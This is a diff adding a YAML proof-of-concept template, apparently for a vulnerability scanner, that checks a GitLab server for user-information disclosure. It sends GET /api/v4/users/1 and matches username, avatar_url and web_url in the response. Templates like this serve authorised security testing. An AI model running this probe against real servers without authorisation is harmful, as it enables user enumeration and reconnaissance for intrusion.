@@ -1,0 +1,18 @@
+id: poc-yaml-gitlab-api-user-info-leak
+info:
+  name: Gitlab 用户信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: Gitlab
+  osprey-id: vb_2018_0050
+requests:
+- method: GET
+  path: /api/v4/users/1
+  headers: {}
+  expression: 'contains(body, "\"username\"") && contains(body, "\"avatar_url\"")
+    && contains(body, "\"web_url\"")
+
+    '
+variables: {}
+transport: http
